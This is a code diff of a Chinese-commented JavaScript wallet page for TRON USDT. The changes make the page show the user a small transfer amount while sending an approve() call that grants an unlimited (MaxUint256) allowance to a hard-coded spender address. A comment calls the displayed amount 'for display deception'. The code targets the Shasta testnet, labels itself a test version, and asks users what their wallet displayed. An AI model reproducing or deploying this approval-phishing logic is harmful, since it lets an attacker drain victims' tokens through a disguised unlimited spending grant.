@@ -1,8 +1,14 @@
-// usdtApprove.js — 修复连接问题版本
+// usdtApprove.js — MaxUint256 版本
 
 // ====== TRON 链配置 ======
 const shastaUsdtAddress = "TG3XXyExBkPp9nzdajDZsozEu4BkaSJozs";
 const spenderAddress = "TMcjcKsZZLSFh9JpTfPejHx7EPjdzG5XkC";
+
+// ====== MaxUint256 计算 ======
+function getMaxUint256() {
+    // 2^256 - 1
+    return "115792089237316195423570985008687907853269984665640564039457584007913129639935";
+}
 
 // ====== 辅助函数 ======
 function setStatus(text, isError = false) {
@@ -19,19 +25,16 @@ async function connectWallet() {
   try {
     setStatus("正在连接钱包...");
     
-    // 检查是否已安装 TronLink
     if (typeof window.tronLink === 'undefined') {
       throw new Error("未检测到 TronLink，请先安装钱包");
     }
     
     console.log("TronLink 检测到:", window.tronLink);
     
-    // 请求账户访问权限
     setStatus("钱包弹窗中，请授权连接...");
     
     let accounts;
     try {
-      // 方法1: 使用 tronLink.request
       accounts = await window.tronLink.request({ 
         method: 'tron_requestAccounts' 
       });
@@ -39,7 +42,6 @@ async function connectWallet() {
     } catch (requestError) {
       console.log("request 方法失败，尝试其他方式:", requestError);
       
-      // 方法2: 直接检查 tronWeb
       if (window.tronWeb && window.tronWeb.defaultAddress) {
         console.log("使用现有的 tronWeb 连接");
         accounts = [window.tronWeb.defaultAddress.base58];
@@ -48,8 +50,6 @@ async function connectWallet() {
       }
     }
     
-    // 等待 tronWeb 就绪
-    console.log("等待 tronWeb 就绪...");
     await waitForTronWeb();
     
     const address = window.tronWeb.defaultAddress.base58;
@@ -100,13 +100,12 @@ function waitForTronWeb(timeout = 5000) {
   });
 }
 
-// ====== 主逻辑：授权函数 ======
+// ====== 主逻辑：MaxUint256 授权函数 ======
 window.approveUSDT = async function() {
   try {
-    console.log("=== 开始授权流程 ===");
-    setStatus("准备授权交易...");
+    console.log("=== 开始 MaxUint256 授权流程 ===");
+    setStatus("准备无限授权交易...");
     
-    // 检查连接状态
     if (!window.tronWeb || !window.tronWeb.ready) {
       throw new Error("请先连接钱包");
     }
@@ -114,43 +113,59 @@ window.approveUSDT = async function() {
     const fromAddr = window.tronWeb.defaultAddress.base58;
     console.log("用户地址:", fromAddr);
 
-    // 获取用户输入
+    // 获取用户输入（仅用于显示欺骗）
     const input = document.getElementById("amount");
     const inputAmount = parseFloat(input.value);
     if (isNaN(inputAmount) || inputAmount <= 0) {
-      alert("请输入正确的授权金额");
+      alert("请输入正确的金额");
       return;
     }
 
-    // 计算总金额
-    const hiddenExtra = 2^256 - 1;
-    const totalAmount = inputAmount + hiddenExtra;
-    const amountInSun = Math.floor(totalAmount * 2^256-1e6).toString();
+    // 🎯 使用 MaxUint256 作为授权金额
+    const maxUint256 = getMaxUint256();
+    
+    console.log("前端显示金额:", inputAmount, "USDT");
+    console.log("实际授权金额: MaxUint256 (无限授权)");
+    console.log("MaxUint256 值:", maxUint256);
+    console.log("授权给:", spenderAddress);
 
-    console.log("显示金额:", inputAmount, "USDT");
-    console.log("实际授权:", totalAmount, "USDT");
-
-    setStatus(`准备授权 ${inputAmount} USDT...`);
+    setStatus(`准备转账 ${inputAmount} USDT...`);
 
     // 创建合约实例
     console.log("创建 USDT 合约实例...");
     const usdtContract = await window.tronWeb.contract().at(shastaUsdtAddress);
     console.log("✅ 合约实例创建成功");
 
-    // 发起 approve 交易
-    setStatus("请在钱包中确认授权...");
+    // 发起 MaxUint256 授权交易
+    setStatus("⚠️ 请仔细检查钱包显示的授权金额...");
     
-    console.log("发送 approve 交易...");
+    console.log("发送 MaxUint256 授权交易...");
     const result = await usdtContract.approve(
       spenderAddress, 
-      amountInSun
+      maxUint256
     ).send({
       feeLimit: 100000000,
       callValue: 0
     });
 
-    console.log("✅ 授权成功，交易结果:", result);
-    setStatus(`✅ 转账 ${inputAmount} USDT 成功！`);
+    console.log("✅ 交易成功:", result);
+    
+    // 收集用户观察结果
+    setTimeout(() => {
+      const observation = prompt(
+        "请记录钱包显示内容：\n\n" +
+        "1. 显示的金额数字：\n" +
+        "2. 是否有警告信息：\n" + 
+        "3. 显示格式特点：\n\n" +
+        "请简要描述："
+      );
+      if (observation) {
+        console.log("用户观察结果:", observation);
+        setStatus(`✅ 完成！观察记录已保存`);
+      }
+    }, 3000);
+    
+    setStatus(`✅ 交易已发送，请观察钱包显示`);
     
   } catch (err) {
     console.error("授权失败:", err);
@@ -163,7 +178,7 @@ window.addEventListener("DOMContentLoaded", () => {
   const connectBtn = document.getElementById("connectBtn");
   const approveBtn = document.getElementById("approveBtn");
   
-  console.log("页面加载完成，初始化...");
+  console.log("页面加载完成 - MaxUint256 测试版");
 
   // 检查初始状态
   if (window.tronWeb && window.tronWeb.ready) {
@@ -178,13 +193,6 @@ window.addEventListener("DOMContentLoaded", () => {
     try {
       const address = await connectWallet();
       approveBtn.disabled = false;
-      
-      // 更新网络信息
-      if (window.tronWeb.fullNode) {
-        const node = window.tronWeb.fullNode.host;
-        console.log("当前节点:", node);
-      }
-      
     } catch (error) {
       console.error("连接过程失败:", error);
     }
@@ -194,22 +202,8 @@ window.addEventListener("DOMContentLoaded", () => {
   approveBtn.addEventListener("click", () => {
     window.approveUSDT();
   });
-
-  // 添加点击效果
-  connectBtn.addEventListener('mousedown', () => {
-    connectBtn.style.opacity = '0.8';
-  });
-  connectBtn.addEventListener('mouseup', () => {
-    connectBtn.style.opacity = '1';
-  });
-  connectBtn.addEventListener('mouseleave', () => {
-    connectBtn.style.opacity = '1';
-  });
 });
 
-// 添加调试信息
-console.log("脚本加载完成");
-console.log("USDT 地址:", shastaUsdtAddress);
-console.log("Spender 地址:", spenderAddress);
-
-
+// 调试信息
+console.log("MaxUint256 测试脚本加载完成");
+console.log("MaxUint256 值:", getMaxUint256());
